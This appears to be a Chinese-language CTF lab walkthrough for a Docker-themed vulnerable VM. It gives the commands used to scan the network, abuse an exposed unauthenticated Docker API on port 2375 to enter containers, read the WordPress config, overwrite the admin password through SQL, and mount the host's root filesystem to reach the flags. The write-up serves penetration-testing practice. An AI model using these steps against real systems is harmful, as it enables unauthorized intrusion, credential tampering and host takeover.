**虚拟机简介**：2 种模式

*   ✅困难：这需要您结合您的 docker 技能以及您的渗透测试技能来实现主机妥协。

**目标**：2个flag（flag\_1 和 flag\_3），在主机上获得 id=0 shell 访问权限

**级别**：简单/中级

## 1.1 信息收集

**在主机开启时，需要选择Easy模式  
**

![](../Images/dbd00a814e9d0ab9cf0f018016f3132e.png)

### 1.主机信息收集

#### 1.使用arp-scan进行扫描探测IP地址

```
arp-scan 192.168.207.0/24
```

![](../Images/dfa0b094e934387e05419f4ac5352ba7.png)

#### 2.通过nmap进行端口扫描

```
nmap -A -sS -sV -v -p- 192.168.207.132
```

**查看开放22、2375和8000端口**

![](../Images/f921da9fdc79a6703106c2244e54d1e0.png)

![](../Images/bb4f960653019d0c67cb58c20e9a0672.png)

### 2.Docker 接口调用

2375端口为docker Remote API接口

#### 1.查看docker版本

```
docker -H tcp://192.168.207.132:2375 version
```

![](../Images/4c5e85365ac391c962b8cb1b5398de97.png)

#### 2.查看运行容器

```
docker -H tcp://192.168.207.132:2375 ps -a
```

查看运行三台容器

![](../Images/5b24e135f7eb11b8acb03f0850221883.png)

#### 3.连接wordpress主机

```
docker -H tcp://192.168.207.132:2375 exec -it content\_wordpress\_1 /bin/bash
```

![](../Images/d4fba46d5ba166cfc6c599af4e3350c2.png)

#### 4.查看配置文件

```
cat wp-config.php
```

![](../Images/88049513207e9348e2c89475350e94c2.png)

#### 5.连接数据库

```

docker -H tcp://192.168.207.132:2375 exec -it content\_db\_1 /bin/bash
```

![](../Images/8039d252e6b7da019eb06d5091046386.png)

#### 6.查看数据库信息

```


use wordpress
```

![](../Images/3527ff87acb4556c7df9e9cb7b2eb6c5.png)

#### 7.修改登录密码

```
UPDATE wordpress.wp\_users SET user\_pass=MD5("password") WHERE ID=1;
```

修改用户名为：bob，密码为：password

![](../Images/4a7a9f6aaad188dcbe1f1d2dd7f92602.png)

#### 8.登录WordPress获取到flag1

![](../Images/8896ee2c206f7e57691155b12f09aa3a.png)

#### 9.查看本地镜像

```
docker -H tcp://192.168.207.132:2375 images
```

![](../Images/b39f9a8e9a56257d92d504aafdc8fd6e.png)

#### 10.创建本地文件挂载

```

docker -H tcp://192.168.207.132:2375 run --rm -it --entrypoint bash -v /:/tmp/root wordpress
```

![](../Images/a0ede998a5a0e81a5bb1263f39e034e8.png)

#### 11.获取flag信息

```
cat flag\_3
```
